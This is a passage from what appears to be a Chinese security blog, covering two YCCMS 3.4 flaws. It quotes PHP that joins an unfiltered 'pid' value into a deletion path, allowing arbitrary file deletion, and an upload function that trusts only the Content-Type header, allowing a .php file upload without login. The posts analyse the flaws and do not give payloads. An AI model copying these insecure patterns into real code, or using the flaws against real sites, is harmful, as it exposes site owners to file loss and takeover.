            if(validate::isNullString($_POST[&#39;pid&#39;])) tool::layer_alert(&#39;没有选择任何图片!&#39;,&#39;?a=pic&#39;,7);
            $_fileDir=ROOT_PATH.&#39;/uploads/&#39;;
            foreach($_POST[&#39;pid&#39;] as $_value)&#123;
                $_filePath=$_fileDir.$_value;
                if(!unlink($_filePath))&#123;
                    tool::layer_alert(&#39;图片删除失败,请设权限为777!&#39;,&#39;?a=pic&#39;,7);
                &#125;else&#123;
                    header(&#39;Location:?a=pic&#39;);
                &#125;
            &#125;

        &#125;

    &#125;
</code></pre>
<p>对<br>pid传进来的值并没有进行过滤就进行了了路径的拼接，导致了路径穿越漏洞，触发任意文件删除漏洞</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2>
        
          <p class="article-more-link">
            <a href="/2022/07/07/YCCMS/YCCMS%203.4%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/YCCMS/YCCMS%203.4%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/" data-id="cl5c2qywo00nby8v1efzde08y" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-YCCMS/YCCMS 3.4 任意文件上传漏洞（二）" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/YCCMS/YCCMS%203.4%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%BA%8C%EF%BC%89/" class="article-date">
  <time datetime="2022-07-08T06:26:08.351Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="YCCMS-3-4-任意文件上传漏洞（二）"><a href="#YCCMS-3-4-任意文件上传漏洞（二）" class="headerlink" title="YCCMS 3.4 任意文件上传漏洞（二）"></a>YCCMS 3.4 任意文件上传漏洞（二）</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>YCCMS 3.4</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p><img src="/resource/YCCMS3.4%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E(%E4%BA%8C)/media/rId24.png" alt="7.png">在不需要登录的情况下可以看到已经上传成功，上传地址为E:/phpstudy/WWW/yccms/uploads/20200509133351770.php定位漏洞位置为controller\CallAction.class.php中的xhUp函数</p>
<pre><code>public function xhUp() &#123;
        if (isset($_GET[&#39;type&#39;])) &#123;
            $_fileupload = new FileUpload(&#39;filedata&#39;,10);
            $_err=$_fileupload-&gt;checkError();
            $_path = $_fileupload-&gt;getPath();
            $_msg=&quot;&#39;..$_path&#39;&quot;;
            $_img = new Image($_path);
            $_img-&gt;xhImg(650,0);
            $_img-&gt;out();
            echo &quot;&#123;&#39;err&#39;:&#39;&quot;.$_err.&quot;&#39;,&#39;msg&#39;:&quot;.$_msg.&quot;&#125;&quot;;
            exit();
        &#125; else &#123;
        Tool::alertBack(&#39;警告：由于非法操作导致上传失败！&#39;);
        &#125;
    &#125;
</code></pre>
<p>跟进到类FileUpload，<br>位于public\class\FileUpload.class.php，然后看到同样也是检查的传入的Content-Type的值</p>
<pre><code>private function checkType() &#123;
        if (!in_array($this-&gt;type,$this-&gt;typeArr)) &#123;
            Tool::alertBack(&#39;警告：不合法的上传类型！&#39;);
        &#125;
    &#125;

private $typeArr = 
array(&#39;image/jpeg&#39;,&#39;image/pjpeg&#39;,&#39;image/png&#39;,&#39;image/x-png&#39;,&#39;image/gif&#39;);
</code></pre>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2>
        
          <p class="article-more-link">
            <a href="/2022/07/07/YCCMS/YCCMS%203.4%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%BA%8C%EF%BC%89/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/YCCMS/YCCMS%203.4%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%BA%8C%EF%BC%89/" data-id="cl5c2qywo00nay8v15fej5uno" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  
  
    <nav id="page-nav">
      <a class="extend prev" rel="prev" href="/page/17/">上一页</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/16/">16</a><a class="page-number" href="/page/17/">17</a><span class="page-number current">18</span><a class="page-number" href="/page/19/">19</a><a class="page-number" href="/page/20/">20</a><span class="space">&hellip;</span><a class="page-number" href="/page/101/">101</a><a class="extend next" rel="next" href="/page/19/">下一页</a>
    </nav>
  
</section>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2022 She11c0de<br>
      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <!--
      <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">首页</a>
  
    <a href="/categories/life" class="mobile-nav-link">生活</a>
  
    <a href="/archives" class="mobile-nav-link">归档</a>
  
</nav>
    -->
    

<!-- 百度分享 start -->

<!-- 百度分享 end -->

<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>




<script src="/js/jquery.scrollUp.min.js"></script>


<script src="/js/jquery.transform.js"></script>


<script src="/js/menu.js"></script>



<script src="/js/script.js"></script>


<script src="/js/scrollUp.js"></script>


  </div>
</body>
</html>